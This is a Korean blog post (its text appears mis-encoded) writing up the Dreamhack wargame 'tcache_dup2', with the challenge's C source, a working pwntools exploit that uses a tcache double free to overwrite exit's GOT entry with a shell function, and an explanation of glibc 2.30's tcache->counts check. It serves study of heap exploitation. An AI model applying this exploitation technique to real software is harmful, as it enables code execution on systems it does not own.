---
title:  "TIL: tcache poisoning 2, __libc_malloc ğŸ§ "
excerpt: "2022.08.23 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---

## Wargame: [tcache_dup2](https://dreamhack.io/wargame/challenges/67)

ë¬¸ì œì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
        size_t size;

        if( idx >= 7 )
                exit(0);

        printf("Size: ");
        scanf("%ld", &size);

        ptr[idx] = malloc(size);

        if(!ptr[idx])
                exit(0);

        printf("Data: ");
        read(0, ptr[idx], size-1);

}

void modify_heap() {
        size_t size, idx;

        printf("idx: ");
        scanf("%ld", &idx);

        if( idx >= 7 )
                exit(0);

        printf("Size: ");
        scanf("%ld", &size);

        if( size > 0x10 )
                exit(0);

        printf("Data: ");
        read(0, ptr[idx], size);
}

void delete_heap() {
        size_t idx;

        printf("idx: ");
        scanf("%ld", &idx);
        if( idx >= 7 )
                exit(0);

        if( !ptr[idx] )
                exit(0);

        free(ptr[idx]);
}

void get_shell() {
        system("/bin/sh");
}
int main() {
        int idx;
        int i = 0;

        initialize();

        while(1) {
                printf("1. Create heap\n");
                printf("2. Modify heap\n");
                printf("3. Delete heap\n");
                printf("> ");

                scanf("%d", &idx);

                switch(idx) {
                        case 1:
                                create_heap(i);
                                i++;
                                break;
                        case 2:
                                modify_heap();
                                break;
                        case 3:
                                delete_heap();
                                break;
                        default:
                                break;
                }
        }
}
```

### Vulnerability Scanning

- `checksec`
    
    <p align="center">
        <a href="/assets/images/TIL220823/Untitled (1).png">
            <img src="/assets/images/TIL220823/Untitled (1).png" width="400">
        </a>
    </p>
    
- ì´ì „ì˜ ë¬¸ì œë“¤ê³¼ ê±°ì˜ ë™ì¼í•œ ì·¨ì•½ì ì„ ê°€ì§€ë¯€ë¡œ ìƒëµí•œë‹¤.

### Exploit

```python
from pwn import *

#p = process("./tcache_dup2")
p = remote("host1.dreamhack.games", 17936)
#gdb.attach(p)
e = ELF("./tcache_dup2")

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def modify(idx, size, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))

# DFB
create(0x30, "A")
create(0x30, "A")

delete(0)
delete(1)

modify(1, 10, "AAAAAAAAB")
delete(1)

exit_got = e.got["exit"]
get_shell = e.symbols["get_shell"]

# overwrite GOT
create(0x30, p64(exit_got))
create(0x30, "AAAA")
create(0x30, p64(get_shell))

delete(7) # exitì„ ì‹¤í–‰

p.interactive()
```

- ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ libcì˜ versionì´ 2.30ì´ë¯€ë¡œ chunkì˜ `key`ë¥¼ ë³€ê²½í•œ í›„ DFBë¥¼ ì¼ìœ¼ì¼œì•¼ í•œë‹¤.
- ì´ exploit codeì—ì„œëŠ” `exit_got`ë¥¼ overwriteí–ˆëŠ”ë°, `printf`**ë‚˜** `free`**ì™€ ê°™ì€ ë‹¤ë¥¸ í•¨ìˆ˜ë¡œ overwriteí–ˆì„ ê²½ìš° exploitì´ ì‹¤íŒ¨**í•˜ëŠ” ê²½ìš°ê°€ ìˆì—ˆë‹¤. ì´ìœ ë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ gotë¥¼ gdbë¡œ í™•ì¸í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.
    
    <p align="center">
        <a href="/assets/images/TIL220823/Untitled (2).png">
            <img src="/assets/images/TIL220823/Untitled (2).png" width="400">
        </a>
    </p>
    
    `printf_got` + 8 == `read_got`, `free_got` + 8 == `puts_got`ì„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ ìƒíƒœì—ì„œ `printf_got`ë‚˜ `free_got`ë¥¼ ëŒ€ìƒìœ¼ë¡œ `read(0, ptr[idx], size - 1);`ì„ ì‹¤í–‰í•˜ê²Œ ë  ê²½ìš° sizeê°€ 0x30ì´ë¯€ë¡œ `read_got`, `puts_got`ì˜ ê°’ì´ ë³€í™”í•˜ê²Œ ë  ê²ƒì„ì„ ì•Œ ìˆ˜ ìˆë‹¤. 
    
    ì‹¤ì œë¡œ `free_got`ë¥¼ ëŒ€ìƒìœ¼ë¡œ exploitì„ í•œ í›„ gdbë¡œ gotì˜ ë³€í™”ë¥¼ í™•ì¸í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.
    
    <p align="center">
        <a href="/assets/images/TIL220823/Untitled (3).png">
            <img src="/assets/images/TIL220823/Untitled (3).png" width="400">
        </a>
    </p>
    
    `free_got`ëŠ” `get_shell`ì˜ ì£¼ì†Œë¡œ ì˜ overwriteë˜ì—ˆì§€ë§Œ, `puts_got`ë„ 0ìœ¼ë¡œ overwriteë˜ì—ˆë‹¤. ì´ë ‡ê²Œ ëœ ê²½ìš° ì´í›„ `puts`ë¥¼ ì‹¤í–‰í•˜ê²Œ ë˜ë©´ **sigmentation fault**ê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.
    
    *(ê·¼ë° ì™œ sizeê°€ 0x30ì¸ë° ë”± ë‹¤ìŒ byteì¸ `puts_got`ë§Œ overwriteë˜ê³ , ê·¸ ë‹¤ìŒ byteë“¤ì€ ì˜¨ì „í•œê±´ì§€ ì˜ ëª¨ë¥´ê² ë‹¤..)*
    

## Exploit Codeì—ì„œ tcache chunkë¥¼ í•˜ë‚˜ ë” ì¶”ê°€í•˜ëŠ” ì´ìœ 

ìœ„ì˜ exploit codeë¥¼ ë³´ë©´ `create(0x30, "A")`ë¥¼ ë‘ ë²ˆ ì‹¤í–‰í•˜ê³ , `delete`ë„ ë‘ ë²ˆ ì‹¤í–‰í•´ì„œ **ì¼ë¶€ëŸ¬ tcacheì— ë‘ ê°œì˜ chunkë¥¼ ì¶”ê°€**í•˜ëŠ” ëª¨ìŠµì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ ê³¼ì •ì€ **glibc 2.27ë¥¼ ì‚¬ìš©í•˜ëŠ” local í™˜ê²½ì—ì„œëŠ” í•„ìš”í•˜ì§€ ì•Šì•˜ì§€ë§Œ, glibc 2.30ì„ ì‚¬ìš©í•˜ëŠ” remote í™˜ê²½ì—ì„œëŠ” í•„ìˆ˜ì **ì´ì—ˆëŠ”ë°, ì–´ì§¸ì„œ ì´ ë¶€ë¶„ì´ í•„ìš”í•˜ê²Œ ë˜ì—ˆëŠ”ì§€ ì°¾ì•„ë³´ì•˜ë‹¤. ì´ ê³¼ì •ì—ì„œ ê³µë¶€í•˜ê²Œ ëœ ë‚´ìš©ì„ ê¸°ë¡í•œë‹¤.

glibc 2.30ì—ì„œëŠ” **tcacheì— ì¡´ì¬í•˜ëŠ” chunkì˜ ê°œìˆ˜ë¥¼ countí•˜ëŠ” ë³€ìˆ˜(**`tcacheâ†’counts`**)**ê°€ ì¡´ì¬í•œë‹¤. ë§Œì•½ ì´ **countê°€ 0ì¼ ê²½ìš°**ì—ëŠ” `__libc_malloc`ì€ `tcache_get`ì„ ì‹¤í–‰í•˜ì§€ ì•Šê³ , `__int_malloc`**ìœ¼ë¡œ memoryë¥¼ allocate**í•œë‹¤. 

### `__libc_malloc`ì˜ ì „ì²´ íë¦„

(ì°¸ê³ : [https://wogh8732.tistory.com/181](https://wogh8732.tistory.com/181))

<p align="center">
    <a href="/assets/images/TIL220823/Untitled (4).png">
        <img src="/assets/images/TIL220823/Untitled (4).png" width="400">
    </a>
</p>

1. ê°€ì¥ ë¨¼ì € `libc_malloc`ì´ ì‹¤í–‰ëœë‹¤. `_malloc_hook`ì´ ì¡´ì¬í•˜ë©´ hookì„ ì‹¤í–‰í•œë‹¤.
2. tcacheê°€ ë¹„ì–´ìˆë‹¤ë©´ `MAYBE_INIT_TCACHE`ë¥¼ ì‹¤í–‰í•œë‹¤. 
    1. ì´ í•¨ìˆ˜ ì•ˆì—ì„œ `tcache_init`ì´ ì‹¤í–‰ëœë‹¤.
    2. `tcache_init`ì—ì„œ `_int_malloc`ì„ ì‹¤í–‰í•˜ì—¬ `tcache_perthread_struct` chunkë¥¼ í• ë‹¹ë°›ëŠ”ë‹¤
3. ìš”ì²­ëœ sizeì— í•´ë‹¹í•˜ëŠ” tcache chunkê°€ ì¡´ì¬í•œë‹¤ë©´, (`tcacheâ†’counts[tc_idx] > 0`) `tcache_get`ì„ ì´ìš©í•´ ì¬í• ë‹¹í•œë‹¤.
4. Reallocateí•  ë§ˆë•…í•œ chunkê°€ tcacheì— ì—†ë‹¤ë©´, `_int_malloc`ì„ ì‹¤í–‰í•œë‹¤.
5. Fastbin, Unsorted bin, Small binì„ í™•ì¸í•˜ê³ , reallocate ê°€ëŠ¥í•œ chunkê°€ ìˆë‹¤ë©´ reallocateí•œë‹¤. ë˜í•œ `tcache_entry[tc_idx]`ì— ìë¦¬ê°€ ë¹„ì–´ ìˆë‹¤ë©´ tcacheì— ë„£ì„ ìˆ˜ ìˆëŠ” ë§Œí¼ binë“¤ì— ìˆëŠ” chunkë¥¼ ë„£ëŠ”ë‹¤.
6. Reallocateí•œ chunkì˜ ì£¼ì†Œë¥¼ returní•œë‹¤.

### `tcache->counts`ì˜ ì‚¬ìš©ì„ Codeë¡œ í™•ì¸í•˜ê¸°

glibc 2.30ì˜ `malloc.c`ë¥¼ ì‚´í´ë³´ë©´, `tcache->counts`ë¼ëŠ” ë³€ìˆ˜ì˜ ì‘ë™ ë°©ì‹ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ([ë§í¬](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=29fa71b3b2a3d0a671149eaf619e4d518c56aef5;hb=af6b1cce9812273c7f597be6536d28eaec6fb89b))

- ìš°ì„  `counts`ëŠ” ì•„ë˜ì™€ ê°™ì´ ì •ì˜ë˜ì–´ ìˆë‹¤.
    
    ```c
    3112 typedef struct tcache_perthread_struct
    3113 {
    3114   uint16_t counts[TCACHE_MAX_BINS];
    3115   tcache_entry *entries[TCACHE_MAX_BINS];
    3116 } tcache_perthread_struct;
    3117
    3118 static __thread bool tcache_shutting_down = false;
    3119 static __thread tcache_perthread_struct *tcache = NULL;
    ```
    
- `tcache_get`, `tcache_put`ì—ì„œ `tcache_counts`ê°€ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ëŠ”ì§€ ì‚´í´ë³´ì.
    
    ```c
    3148 static __always_inline void
    3149 tcache_put (mchunkptr chunk, size_t tc_idx)
    3150 {
    3151   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    3152 
    3153   /* Mark this chunk as "in the tcache" so the test in _int_free will
    3154      detect a double free.  */
    3155   e->key = tcache_key;
    3156 
    3157   e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
    3158   tcache->entries[tc_idx] = e;
    3159   ++(tcache->counts[tc_idx]);
    3160 }
    3161 
    3162 /* Caller must ensure that we know tc_idx is valid and there's
    3163    available chunks to remove.  */
    3164 static __always_inline void *
    3165 tcache_get (size_t tc_idx)
    3166 {
    3167   tcache_entry *e = tcache->entries[tc_idx];
    3168   if (__glibc_unlikely (!aligned_OK (e)))
    3169     malloc_printerr ("malloc(): unaligned tcache chunk detected");
    3170   tcache->entries[tc_idx] = REVEAL_PTR (e->next);
    3171   --(tcache->counts[tc_idx]);
    3172   e->key = 0;
    3173   return (void *) e;
    3174 }
    ```
    
    - 3159ë²ˆ, 3171ë²ˆ lineì—ì„œ **chunkê°€ tcacheì— ì¶”ê°€ ë° ì œê±°ë  ë•Œë§ˆë‹¤** `tcache->counts[tc_idx]`**ê°€ updateë¨ì„ í™•ì¸**í•  ìˆ˜ ìˆë‹¤.
- glibc 2.30ì˜ `__libc_malloc`ì—ì„œ `tcache_counts`ê°€ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ëŠ”ì§€ ì‚´í´ë³´ì.
    
    ```c
    3258 #if IS_IN (libc)
    3259 void *
    3260 __libc_malloc (size_t bytes)
    3261 {
    3262   mstate ar_ptr;
    3263   void *victim;
    3264
    3265   _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
    3266                   "PTRDIFF_MAX is not more than half of SIZE_MAX");
    3267
    3268   if (!__malloc_initialized)
    3269     ptmalloc_init ();
    3270 #if USE_TCACHE
    3271   /* int_free also calls request2size, be careful to not pad twice.  */
    3272   size_t tbytes = checked_request2size (bytes);
    3273   if (tbytes == 0)
    3274     {
    3275       __set_errno (ENOMEM);
    3276       return NULL;
    3277     }
    3278   size_t tc_idx = csize2tidx (tbytes);
    3279
    3280   MAYBE_INIT_TCACHE ();
    3281
    3282   DIAG_PUSH_NEEDS_COMMENT;
    3283   if (tc_idx < mp_.tcache_bins
    3284       && tcache
    3285       && tcache->counts[tc_idx] > 0)
    3286     {
    3287       victim = tcache_get (tc_idx);
    3288       return tag_new_usable (victim);
    3289     }
    3290   DIAG_POP_NEEDS_COMMENT;
    3291 #endif
    3292
    3293   if (SINGLE_THREAD_P)
    3294     {
    3295       victim = tag_new_usable (_int_malloc (&main_arena, bytes));
    3296       assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
    3297               &main_arena == arena_for_chunk (mem2chunk (victim)));
    3298       return victim;
    3299     }
    3300
    3301   arena_get (ar_ptr, bytes);
    3302
    3303   victim = _int_malloc (ar_ptr, bytes);
    3304   /* Retry with another arena only if we were able to find a usable arena
    3305      before.  */
    3306   if (!victim && ar_ptr != NULL)
    3307     {
    3308       LIBC_PROBE (memory_malloc_retry, 1, bytes);
    3309       ar_ptr = arena_get_retry (ar_ptr, bytes);
    3310       victim = _int_malloc (ar_ptr, bytes);
    3311     }
    3312
    3313   if (ar_ptr != NULL)
    3314     __libc_lock_unlock (ar_ptr->mutex);
    3315
    3316   victim = tag_new_usable (victim);
    3317
    3318   assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
    3319           ar_ptr == arena_for_chunk (mem2chunk (victim)));
    3320   return victim;
    3321 }
    
    ```
    
    - 3285ë²ˆ lineì—ì„œ `tcache_counts[tc_idx]`**ê°€ 0ë³´ë‹¤ ì»¤ì•¼ë§Œ** `tcache_get`**ì„ ì‹¤í–‰í•¨**ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
- glibc 2.27ì˜ `__libc_malloc`ì—ì„œëŠ” `tcache_counts[tc_idx]`ì˜ ê°’ì„ í™•ì¸í•˜ì§€ ì•ŠìŒì„ ì•„ë˜ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ([ë§í¬](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=f8e7250f70f6f26b0acb5901bcc4f6e39a8a52b2;hb=23158b08a0908f381459f273a984c6fd328363cb))
    
    ```c
    3026 void *
    3027 __libc_malloc (size_t bytes)
    3028 {
    3029   mstate ar_ptr;
    3030   void *victim;
    3031 
    3032   void *(*hook) (size_t, const void *)
    3033     = atomic_forced_read (__malloc_hook);
    3034   if (__builtin_expect (hook != NULL, 0))
    3035     return (*hook)(bytes, RETURN_ADDRESS (0));
    3036 #if USE_TCACHE
    3037   /* int_free also calls request2size, be careful to not pad twice.  */
    3038   size_t tbytes;
    3039   checked_request2size (bytes, tbytes);
    3040   size_t tc_idx = csize2tidx (tbytes);
    3041 
    3042   MAYBE_INIT_TCACHE ();
    3043 
    3044   DIAG_PUSH_NEEDS_COMMENT;
    3045   if (tc_idx < mp_.tcache_bins
    3046       /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
    3047       && tcache
    3048       && tcache->entries[tc_idx] != NULL)
    3049     {
    3050       return tcache_get (tc_idx);
    3051     }
    3052   DIAG_POP_NEEDS_COMMENT;
    3053 #endif
    3054 
    3055   if (SINGLE_THREAD_P)
    3056     {
    3057       victim = _int_malloc (&main_arena, bytes);
    3058       assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
    3059               &main_arena == arena_for_chunk (mem2chunk (victim)));
    3060       return victim;
    3061     }
    3062 
    3063   arena_get (ar_ptr, bytes);
    3064 
    3065   victim = _int_malloc (ar_ptr, bytes);
    3066   /* Retry with another arena only if we were able to find a usable arena
    3067      before.  */
    3068   if (!victim && ar_ptr != NULL)
    3069     {
    3070       LIBC_PROBE (memory_malloc_retry, 1, bytes);
    3071       ar_ptr = arena_get_retry (ar_ptr, bytes);
    3072       victim = _int_malloc (ar_ptr, bytes);
    3073     }
    3074 
    3075   if (ar_ptr != NULL)
    3076     __libc_lock_unlock (ar_ptr->mutex);
    3077 
    3078   assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
    3079           ar_ptr == arena_for_chunk (mem2chunk (victim)));
    3080   return victim;
    3081 }
    ```
    

### ê²°ë¡ 

tcacheì— ì¡´ì¬í•˜ëŠ” chunkì˜ ê°œìˆ˜ë¥¼ ì„¸ëŠ” ë³€ìˆ˜ `tcache->counts[tc_idx]`ì˜ ê°’ì„ ì‹ ê²½ì“°ì§€ ì•Šê³  ì•„ë˜ì™€ ê°™ì´ exploitì„ ìœ„í•´ DFBë¥¼ ì¼ìœ¼ì¼°ë‹¤ê³  ìƒê°í•´ë³´ì.

```python
# ...
# DFB
create(0x30, "A")

delete(0)

modify(0, 10, "AAAAAAAAB")
delete(0)

# overwrite GOT
create(0x30, p64(exit_got))
create(0x30, "AAAA")
create(0x30, p64(get_shell))

delete(7) # exitì„ ì‹¤í–‰

p.interactive()
```

ì´ ê²½ìš° `tcache->counts[tc_idx]`**ì˜ ê°’ì´ DFBê°€ ì¼ì–´ë‚œ í›„ì—ëŠ” -1ì´ ë˜ë¯€ë¡œ**, `create(0x30, p64(exit_got))`ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ `__libc_malloc`ì€ tcacheì— ìˆëŠ” ìš°ë¦¬ê°€ ì›í•˜ëŠ” chunkê°€ ì•„ë‹Œ, ë‹¤ë¥¸ chunkë¥¼ returní•  ê²ƒì´ê³ , ë”°ë¼ì„œ **got overwritingì´ ì‹¤íŒ¨**í•˜ê²Œ ë  ê²ƒì´ë‹¤.

ë”°ë¼ì„œ `tcache->counts[tc_idx]`ì˜ ê°’ì´ 0 ì´ìƒì´ ë˜ë„ë¡ ê¸°ì¡´ì˜ exploit codeì²˜ëŸ¼ **í•˜ë‚˜ì˜ chunkë¥¼ ì¶”ê°€ë¡œ tcacheì— ë„£ì–´ì¤˜ì•¼ í•  ê²ƒ**ì´ë‹¤.